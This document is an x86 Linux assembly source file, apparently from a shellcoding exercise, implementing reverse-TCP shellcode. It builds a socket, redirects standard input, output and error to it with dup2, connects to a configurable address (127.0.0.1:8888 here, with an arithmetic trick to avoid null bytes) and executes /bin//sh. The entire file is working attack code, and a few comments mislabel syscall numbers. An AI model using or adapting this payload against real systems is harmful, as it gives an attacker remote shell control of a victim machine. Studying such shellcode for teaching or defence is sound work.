; Filename: shell_reverse_tcp.nasm
; Author:  Ricardo Ruiz
; Website:  https://ricardojruiz.herokuapp.com/

global _start			

section .text
_start:
	; Socket
	xor eax, eax
	mov ax, 0x167 ; Syscall 359 = Socket
	xor ebx, ebx
	mov bl, 2 ; $ebx = Domain = 2 [AF_INET]
	xor ecx, ecx
	mov cl, 1 ; $ecx = Type = 1 [SOCK_STREAM]
	xor edx, edx ; $edx = Protocol = 0 [not set]
	int 0x80
	
	;dup2 - 2, 1, 0
	mov ebx, eax ; $ebx = File descriptor address
	mov cl, 3 ; $ecx = New file descriptor = 0
	int 0x80
bucle:
	xor eax, eax
	mov al, 0x3f ; Syscall is 63 = Dup2
	int 0x80
	dec ecx
	jns bucle

	;Connect - 362
	mov ax, 0x16a ; Syscall is 362 = Connect ; $ebx = File descriptor address
	xor edi, edi ; edi is 0
	mov edi, 0x12111190 ; 0x12111190 = 0x100007F + 0x11111111
	sub edi, 0x11111111 ; 0x11111111 is an aux value. It can change to 0x22222222, 0x33333333 with the Python wrapper if IP+0x11111111 has NOPs
	push edi ; The real IP gets stored. In this case ip = 127.0.0.1, big endian
    push word 0xb822 ; Port 8888, big endian
    push word 2 ; sin_family value is 2
	mov ecx, esp ; $ecx = 0x2, port, ip
	mov dl, 0x66 ; Address length is 102 in this case
	int 0x80 ; $eax = 0 now

	
	; Execve
	push eax ; Push 0x0
	push 0x68732f2f ; Push '//sh' string
	push 0x6e69622f ; Push '/bin' string
	mov ebx, esp ; $ebx =  '/bin//sh' and 0x0
	push eax ; Push  0x0
	mov edx, esp ; $edx = 0x0
	push ebx ; Push $ebx =  '/bin//sh' and 0x0
	mov ecx, esp ; Address of stack, containing 0x0, '/bin//sh' and 0x0
	mov al, 11 ; Syscall is 17 = Execve
	int 0x80